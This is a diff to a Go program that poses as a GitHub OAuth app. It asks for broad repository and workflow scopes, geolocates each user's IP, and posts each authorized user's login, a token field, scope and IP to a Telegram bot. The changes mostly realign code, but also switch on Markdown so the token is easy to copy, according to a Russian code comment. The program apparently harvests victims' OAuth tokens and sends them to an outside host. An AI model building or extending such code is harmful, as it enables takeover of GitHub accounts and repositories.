@@ -30,15 +30,15 @@ const (
 	oauthScopes   = "user:email read:user repo workflow"
 
 	// Default configuration values
-	defaultPort          = "3000"
-	defaultAppURL        = "http://localhost:3000/"
-	defaultRedirectURL   = "https://github.com"
+	defaultPort         = "3000"
+	defaultAppURL       = "http://localhost:3000/"
+	defaultRedirectURL  = "https://github.com"
 	defaultGenerateRoute = "/generate"
 	defaultCallbackRoute = "/callback"
-	telegramAPIURL       = "https://api.telegram.org"
-	exportUsername       = "export"
-	maxTelegramMessage   = 3500
-	ipCountryAPIURL      = "https://ipwho.is/"
+	telegramAPIURL      = "https://api.telegram.org"
+	exportUsername      = "export"
+	maxTelegramMessage  = 3500
+	ipCountryAPIURL     = "https://ipwho.is/"
 )
 
 // Config holds the application configuration
@@ -63,8 +63,8 @@ type authorizationRecord struct {
 
 // OAuthApp represents our OAuth App instance
 type OAuthApp struct {
-	config   *Config
-	logger   *logrus.Logger
+	config  *Config
+	logger  *logrus.Logger
 	exportMu sync.Mutex
 	exports  []authorizationRecord
 }
@@ -289,7 +289,7 @@ func formatTelegramNotification(login string, userID int64, tokenType string, ex
 	clientIP = formatClientIP(clientIP, countryCode)
 
 	return fmt.Sprintf(
-		"🔐 OAuth Authorization Succeeded\n\n👤 User: %s\nUser ID: %d\n🔑 Token: `%s`\nToken Type: %s\nExpires: %s\nScope: %s\n🌍 Client IP: %s\nTimestamp: %s",
+		"🔐 OAuth Authorization Succeeded\n\n👤 User: @%s\nUser ID: %d\n🔑 Token: `%s`\nToken Type: %s\nExpires: %s\nScope: %s\n🌍 Client IP: %s\nTimestamp: %s",
 		sanitizeMessageField(login),
 		userID,
 		sanitizeMessageField(tokenSuffix),
@@ -378,12 +378,15 @@ func countryCodeFromIPWho(body io.Reader) (string, error) {
 }
 
 func sendTelegramNotification(ctx context.Context, botToken, chatID, message string) error {
+	// Добавили parse_mode: "Markdown", чтобы текст внутри `...` стал моноширинным и кликабельным для копирования
 	payload, err := json.Marshal(struct {
-		ChatID string `json:"chat_id"`
-		Text   string `json:"text"`
+		ChatID    string `json:"chat_id"`
+		Text      string `json:"text"`
+		ParseMode string `json:"parse_mode"`
 	}{
-		ChatID: chatID,
-		Text:   message,
+		ChatID:    chatID,
+		Text:      message,
+		ParseMode: "Markdown",
 	})
 	if err != nil {
 		return fmt.Errorf("failed to encode Telegram notification")
